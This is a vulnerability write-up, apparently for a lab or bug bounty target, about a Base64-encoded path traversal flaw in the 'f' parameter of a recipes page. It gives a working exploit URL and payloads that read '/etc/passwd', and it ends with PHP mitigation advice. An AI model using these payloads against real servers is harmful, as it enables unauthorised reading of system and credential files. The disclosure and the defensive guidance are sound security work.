# Local File Inclusion (LFI) / Path Traversal - Recipes

## Summary

I identified a Local File Inclusion (LFI) / Path Traversal vulnerability in the `f` parameter of the application's recipes functionality.

The application accepts user-controlled input through the `f` parameter and uses it to read files from the server without proper validation or sanitization. By injecting a path traversal payload encoded using Base64, an attacker can read sensitive files outside the intended directory, including system configuration files like `/etc/passwd`.

An attacker can craft a malicious URL that reads arbitrary files from the server, potentially leading to information disclosure, credential theft, or further exploitation.

## Vulnerability Type

**Local File Inclusion (LFI) / Path Traversal (Base64 Encoded)**

## Vulnerable Parameter

```text
f
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/recipes/index.php?f=READ.md
```

## Steps to Reproduce

1. Navigate to the vulnerable recipes page at `https://kzlabs.in/subdomains/recipes/index.php`.

2. Replace the value of the `f` parameter with a Base64-encoded path traversal payload:

   ```text
   L2V0Yy9wYXNzd2Q=
   ```

   Decoded value:
   ```text
   /etc/passwd
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/subdomains/recipes/index.php?f=L2V0Yy9wYXNzd2Q=
   ```

4. Observe that the application decodes the Base64 value and reads/displays the contents of `/etc/passwd` in the response.

5. The output reveals system user accounts, including the `root` user.

## Payloads Used

```text
L2V0Yy9wYXNzd2Q=
L2V0Yy9wYXNzd2Q%3D
```

Base64-encoded values:
```text
/etc/passwd       → L2V0Yy9wYXNzd2Q=
../../../etc/passwd → Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
```

## Impact

An attacker can:

- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, `/etc/hosts`)
- Read application configuration files (database credentials, API keys)
- Read application source code
- Extract sensitive user data
- Enumerate system users and services
- Potentially achieve Remote Code Execution (RCE) by reading log files or combining with other vulnerabilities
- Bypass authentication by reading session files or configuration

## Recommendation

To mitigate this vulnerability:

- **Avoid User-Controlled Paths**: Do not use user input directly to determine file paths.

- **Use a Whitelist**: Only allow specific, pre-approved recipe files to be accessed.
  ```php
  $allowed_recipes = ['READ.md', 'recipe1.md', 'recipe2.md'];
  $f = base64_decode($_GET['f']);
  if (!in_array(basename($f), $allowed_recipes)) {
      die("File not allowed.");
  }
  ```

- **Validate Input**: Use `basename()` to prevent directory traversal.
  ```php
  $f = basename(base64_decode($_GET['f']));
  $path = "/var/www/recipes/" . $f;
  ```

- **Use Realpath**: Resolve the real path and verify it's within the intended directory.
  ```php
  $base_dir = '/var/www/recipes/';
  $f = base64_decode($_GET['f']);
  $real_path = realpath($base_dir . $f);
  if (strpos($real_path, $base_dir) !== 0) {
      die("Invalid file path.");
  }
  ```

- **Disable `allow_url_include`**: Prevent remote file inclusion in `php.ini`.
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```

- **Chroot Jail**: Restrict the web server to a specific directory.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block path traversal payloads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
